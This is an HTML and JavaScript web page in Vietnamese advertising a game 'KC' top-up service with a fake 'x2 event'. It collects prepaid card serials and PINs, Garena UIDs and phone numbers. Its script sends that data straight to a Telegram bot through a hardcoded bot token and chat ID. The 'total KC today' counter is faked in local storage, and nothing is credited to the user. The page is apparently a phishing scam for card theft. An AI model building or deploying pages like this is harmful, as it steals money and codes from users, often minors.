<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>N·∫°p KC Game</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
body{
    background:linear-gradient(135deg,#141e30,#243b55);
    min-height:100vh;
    font-family:'Segoe UI',sans-serif
}
header{background:rgba(0,0,0,.75)}
.card{
    border-radius:18px;
    box-shadow:0 20px 40px rgba(0,0,0,.5)
}
.type{display:none}
.type.active{display:block}
.btn-nap{
    background:#ff6b00;
    border:none;
    font-weight:700;
    padding:14px;
    font-size:1.1rem;
    border-radius:12px
}
.btn-nap:disabled{background:#999}
.loading{
    display:none;
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.7);
    align-items:center;
    justify-content:center;
    z-index:999
}
.spinner{
    width:60px;height:60px;
    border:6px solid #eee;
    border-top:6px solid #ff6b00;
    border-radius:50%;
    animation:spin 1s linear infinite
}
@keyframes spin{100%{transform:rotate(360deg)}}
.stat-box{
    background:#0d6efd;
    color:#fff;
    padding:10px;
    border-radius:10px;
    text-align:center;
    font-weight:700
}
</style>
</head>

<body>

<header class="py-4 text-white text-center">
<h1 class="fw-bold">N·∫†P KC GAME</h1>
<p>Uy t√≠n 24/7 ‚Ä¢ X·ª≠ l√Ω nhanh ‚Ä¢ KC t·ª± ƒë·ªông</p>
</header>

<div class="container my-4">
<div class="stat-box mb-3">
üìä T·ªïng KC h√¥m nay: <span id="totalKC">0</span> KC
</div>

<div class="row justify-content-center">
<div class="col-md-6">

<div class="card p-4">
<h4 class="text-center text-warning fw-bold mb-3">FORM N·∫†P KC</h4>

<div class="text-center mb-3">
<span class="badge bg-danger" id="eventText">üéÅ EVENT X2 KC ƒêANG B·∫¨T</span>
</div>

<form id="napForm">

<div class="btn-group w-100 mb-3">
<input type="radio" class="btn-check" name="type" id="garena" checked>
<label class="btn btn-outline-primary" for="garena">Garena</label>

<input type="radio" class="btn-check" name="type" id="dienthoai">
<label class="btn btn-outline-primary" for="dienthoai">ƒêi·ªán Tho·∫°i</label>

<input type="radio" class="btn-check" name="type" id="bank">
<label class="btn btn-outline-primary" for="bank">Ng√¢n H√†ng</label>
</div>

<div id="menhgia" class="type active">
<select class="form-select mb-2" id="menhgiaVal">
<option value="">-- Ch·ªçn m·ªánh gi√° --</option>
<option>10000</option>
<option>20000</option>
<option>50000</option>
<option>100000</option>
<option>200000</option>
<option>500000</option>
</select>
<input class="form-control fw-bold text-success" id="kc" disabled placeholder="KC nh·∫≠n ƒë∆∞·ª£c">
</div>

<div id="card" class="type active">
<input class="form-control mb-2" id="seri" placeholder="S·ªë Seri">
<input class="form-control mb-2" id="mathe" placeholder="M√£ th·∫ª">
</div>

<div id="garenaBox" class="type active">
<input class="form-control mb-2" id="uid" placeholder="UID Garena">
</div>

<div id="phoneBox" class="type">
<select class="form-select mb-2" id="nhamang">
<option>Viettel</option>
<option>Mobifone</option>
<option>Vinaphone</option>
</select>
<input class="form-control mb-2" id="sdt" placeholder="S·ªë ƒëi·ªán tho·∫°i">
</div>

<div id="bankBox" class="type">
<input class="form-control mb-2" id="sotien" placeholder="S·ªë ti·ªÅn">
<input class="form-control mb-2" id="bankname" placeholder="Ng√¢n h√†ng chuy·ªÉn">
<input class="form-control mb-2" id="noidung" placeholder="N·ªôi dung CK">
<input class="form-control mb-2" id="tenck" placeholder="T√™n ng∆∞·ªùi chuy·ªÉn">
</div>

<button class="btn btn-nap text-white w-100 mt-2" id="submitBtn">
G·ª¨I ƒê∆†N N·∫†P
</button>
</form>

</div>
</div>
</div>
</div>

<div class="loading" id="loading"><div class="spinner"></div></div>

<script>
/* ===== CONFIG ===== */
const BOT_TOKEN = "8301552072:AAE8XG6Azgud5GVtYPrvvLo04HE8F_9ZN2c";
const CHAT_ID  = "5903999893";
const KC_RATE  = 60;
const EVENT_X2 = true;
const COOLDOWN = 60000;

/* ===== EVENT TEXT ===== */
if(!EVENT_X2) document.getElementById("eventText").style.display="none";

/* ===== STATS ===== */
const today = new Date().toLocaleDateString();
let stats = JSON.parse(localStorage.kcStats || "{}");
if(stats.date !== today) stats = {date:today,total:0};
totalKC.innerText = stats.total;

/* ===== UI SWITCH ===== */
const show=(...ids)=>{
document.querySelectorAll('.type').forEach(e=>e.classList.remove('active'));
ids.forEach(id=>document.getElementById(id).classList.add('active'));
};
garena.onclick=()=>show('menhgia','card','garenaBox');
dienthoai.onclick=()=>show('menhgia','card','phoneBox');
bank.onclick=()=>show('bankBox');

/* ===== KC CALC ===== */
menhgiaVal.onchange=()=>{
let v=parseInt(menhgiaVal.value||0);
let kcVal=(v/10000)*KC_RATE;
if(EVENT_X2) kcVal*=2;
kc.value = kcVal ? kcVal+" KC" : "";
};

/* ===== VALIDATE ===== */
function validCard(s,m){
return /^[0-9]{10,15}$/.test(s)&&/^[0-9]{10,15}$/.test(m);
}

/* ===== SUBMIT ===== */
napForm.onsubmit=async e=>{
e.preventDefault();

if(!bank.checked && !validCard(seri.value,mathe.value)){
alert("‚ùå Seri ho·∫∑c m√£ th·∫ª kh√¥ng h·ª£p l·ªá!");
return;
}

if(localStorage.lastSend && Date.now()-localStorage.lastSend<COOLDOWN){
alert("‚õî Vui l√≤ng ch·ªù tr∆∞·ªõc khi g·ª≠i ti·∫øp!");
return;
}

loading.style.display="flex";
submitBtn.disabled=true;

let kcNhan=parseInt(kc.value)||0;
stats.total+=kcNhan;
localStorage.kcStats=JSON.stringify(stats);
totalKC.innerText=stats.total;

let msg=
`üîî ƒê∆†N N·∫†P M·ªöI
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìå Lo·∫°i: ${garena.checked?"Garena":dienthoai.checked?"ƒêi·ªán Tho·∫°i":"Ng√¢n H√†ng"}
üí∞ M·ªánh gi√°: ${menhgiaVal.value||sotien.value}
üíé KC nh·∫≠n: ${kcNhan}
üéÅ Event x2: ${EVENT_X2?"C√ì":"KH√îNG"}
üßæ Seri: ${seri.value||"‚Äî"}
üé´ M√£ th·∫ª: ${mathe.value||"‚Äî"}
üë§ UID: ${uid.value||"‚Äî"}
üì± SƒêT: ${sdt.value||"‚Äî"}
‚è∞ ${new Date().toLocaleString()}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CHAT_ID,text:msg})
});

localStorage.lastSend=Date.now();
alert("‚úÖ G·ª≠i ƒë∆°n th√†nh c√¥ng!");
location.reload();
};
</script>

</body>
    </html>
